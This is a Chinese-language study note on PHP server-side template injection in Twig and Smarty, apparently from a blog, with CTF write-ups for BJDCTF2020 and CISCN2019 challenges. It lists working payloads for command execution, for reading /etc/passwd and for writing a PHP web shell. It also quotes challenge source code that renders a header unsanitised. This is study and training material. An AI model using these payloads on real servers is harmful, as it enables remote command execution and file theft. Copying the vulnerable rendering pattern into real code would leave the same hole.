## PHP模板注入

看到网上一张图：

![模板](https://gitee.com/bx33661/image/raw/master/path/1904837406.png)

### Twig

![img](https://gitee.com/bx33661/image/raw/master/path/logo.md.png)

> 官网翻译：
>
> 快速: Twig将模板编译为简单的优化PHP代码。与常规PHP代码相比，开销减少到最低限度
>
> 安全: Twig有一个沙盒模式来评估不受信任的模板代码。这允许Twig用作用户可以修改模板设计的应用程序的模板语言。
>
> 灵活: Twig由灵活的词法分析器和解析器提供支持。这允许开发人员定义自己的自定义标签和过滤器，并创建自己的DSL。

参考文档：

- https://www.cnblogs.com/bmjoker/p/13508538.html

- https://xz.aliyun.com/t/10056?time__1311=Cqjx2DRiDtYmqGNDQiuB%3DDuiDnQCYCWK4D#toc-16



```php
$twig->render("Hello {{name}}", array('name' => $escaped_name));
```

- 第一个参数，用于指明这个操作将渲染哪个模版文件。
- 第二个参数是一个数组，`array('name' => $escaped_name)`，它提供模版所占位的变量对应的值。

渲染结果：

```php
Hello {{name }} => Hello dx....
```

如果这个`$escaped_name`形式和内容可以被用户控制的话，就可以实现注入

在Twig中，`{{name}}`还可以接受一些表达式，最后输出表达式的结果，输出渲染



Twig的注释：Twig 模板引擎默认的注释语法是 `{# ... #}`。

例如：

```twig
{# 这是一个注释，不会显示在页面上 #}
<p>这是一个段落，将会显示在页面上。</p>
```

在这个例子中，`{# 这是一个注释，不会显示在页面上 #}` 是一个注释，

不会出现在最终的HTML输出中，而 `<p>这是一个段落，将会显示在页面上。</p>` 则会被正常渲染。

画了一个使用注释判断的流程图：

![image-20241025150328932](https://gitee.com/bx33661/image/raw/master/path/image-20241025150328932.png)

#### Twig-1.x

`getFilter`函数：

```php
public function getFilter($name)
  {
    ...
    foreach ($this->filterCallbacks as $callback) {
    if (false !== $filter = call_user_func($callback, $name)) {
    //出现call_user_func
      return $filter;
    }
  }
  return false;
}

public function registerUndefinedFilterCallback($callable)
{
  $this->filterCallbacks[] = $callable;
}
```

利用这个可以构造

> 在Twig 1.x中:**`_self`**：当前模板对象，可以用于调用当前模板中的宏（macro）

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("[Command]")}}
```



#### Twig-2以及更高版本

Payload：

```twig
{{["id"]|map("system")}}
{{["id"]|map("passthru")}}
{{["id"]|map("exec")}}    // 无回显

{{["id", 0]|sort("system")}}
{{["id", 0]|sort("passthru")}}
{{["id", 0]|sort("exec")}}    // 无回显

{{["id"]|filter("system")}}
{{["id"]|filter("passthru")}}
{{["id"]|filter("exec")}}    // 无回显

{{[0, 0]|reduce("system", "id")}}
{{[0, 0]|reduce("passthru", "id")}}
{{[0, 0]|reduce("exec", "id")}}    // 无回显
```



...但是这个我还没遇见相应的问题，没有测试过





### smarty

> 官方解释：
>
> Smarty是PHP的模板引擎，有助于将表示 (HTML/CSS) 与应用程序逻辑分离。这意味着PHP代码是应用程序逻辑，并且与表示分离

还有一个变种：

SmartyBC:`SmartyBC`（Backward Compatibility）是 Smarty 模板引擎的一个变种，旨在保持与旧版 Smarty（尤其是 Smarty 2）的兼容性。在 Smarty 3 中，为了引入新的功能和改进性能，一些旧版 Smarty 的语法和行为发生了变化。`SmartyBC` 提供了一种方法，使开发者可以在使用 Smarty 3 的同时，仍然支持旧版 Smarty 的语法和行为。



```php
{$smarty.version}
```

返回`Smarty engine`版本号



老版本的smarty支持`{php}{/php}`的标签🏷

> 不过在新的版本这个语法已经被废除，仅在SmartyBC中可用。

就可以执行php命令

```php
{php}phpinfo();{/php}
{php}。。。。。;{/php}
```



`Smarty`类的`getStreamVariable()`方法代码如下：

```php
public function getStreamVariable($variable)
{
        $_result = '';
        $fp = fopen($variable, 'r+');
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
```

方法概述：`getStreamVariable` 方法的主要功能是从给定的文件流中读取内容，并将其作为字符串返回。如果文件流无法打开或文件不存在，方法将根据配置决定是否抛出异常或返回 `null`

利用这个可以构造读取文件的Payload：

```php
{self::getStreamVariable("file:///etc/passwd")}
```

> ⚠️：**在3.1.30以上的Smarty版本中：**
>
> *官方已经移除了这个方法，所以说不能执行成功*



#### {if}标签

基本语法：

```php
{if $condition}
    {# 满足条件时执行的内容 #}
{elseif $another_condition}
    {# 满足另一个条件时执行的内容 #}
{else}
    {# 以上条件都不满足时执行的内容 #}
{/if}

```

需要注意的是： ----- **每个{if}必须有一个配对的{/if}**

**全部的PHP条件表达式和函数都可以在if内使用**

所以利用这个标签我们就可以进行模板注入

```php
{if phpinfo()}{/if}
{if system('ls /')}{/if}
{if cat /flag}{/if}
```



### 例子

#### [BJDCTF2020]The mystery of ip

----

> 基于xff的模板注入
>
> 这个是php的smarty注入----可以通过{$smarty.version}查到版本

<img src="https://gitee.com/bx33661/image/raw/master/path/image-20241011173937368.png" style="zoom:50%;" />

抓包测试：

![2af3ad8b9abd9f3c8d2c2365664a4c4](https://gitee.com/bx33661/image/raw/master/path/2af3ad8b9abd9f3c8d2c2365664a4c4.png)

这个可以直接执行命令：

```
{{system("ls")}}
{{system(cat /flag)}}
```



题目源代码如下：

```php
<?php
    require_once('header.php');
    require_once('./libs/Smarty.class.php');
    $smarty = new Smarty();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    //$your_ip = $smarty->display("string:".$ip);
    echo "<div class=\"container panel1\">
                <div class=\"row\">
                <div class=\"col-md-4\">    
                </div>
            <div class=\"col-md-4\">
                <div class=\"jumbotron pan\">
                    <div class=\"form-group log\">
                        <label><h2>Your IP is : ";
    $smarty->display("string:".$ip);
    echo "            </h2></label>
                    </div>        
                </div>
            </div>
                <div class=\"col-md-4\">    
                </div>
                </div>
            </div>";
?>

```



#### [CISCN2019 华东南赛区]Web11

> Smarty模板注入

---

我们发现使用的是`smarty`模板，我们抓包发现XFF是注入点

![image-20241021213802033](https://gitee.com/bx33661/image/raw/master/path/image-20241021213802033.png)

于是我们尝试是不是模板注入问题

- a{*comment*}b

在Smarty中`{*comment*}`注释符号不会渲染出来

- {$smarty.version}

![image-20241021213941201](https://gitee.com/bx33661/image/raw/master/path/image-20241021213941201.png)

```php
{if system('ls /')}{/if}
/*
          Current IP:bin dev etc flag home lib media mnt opt proc root run sbin
          srv sys usr var
          */

{if system('cat /flag')}{/if}
//Current IP:<?php $flag="flag{b5e17b43-ecc4-4b94-9bf5-619023b5a46e}";
```



#### [BJDCTF2020]Cookie is so stable

---

看题目我们就需要关注cookie，有两个界面

- flag,比较重要，有一个输入框
- hint,这个没啥用

我们尝试输入admin，题目直接输出`hello admin`

这让我们感到ssti的熟悉，尝试`{{7*7}}`

再分析这是一个PHP网站,基本上就是

- twig
- Smarty

Payload:

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

![](https://gitee.com/bx33661/image/raw/master/path/image-20241024103533563.png)

```php
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```



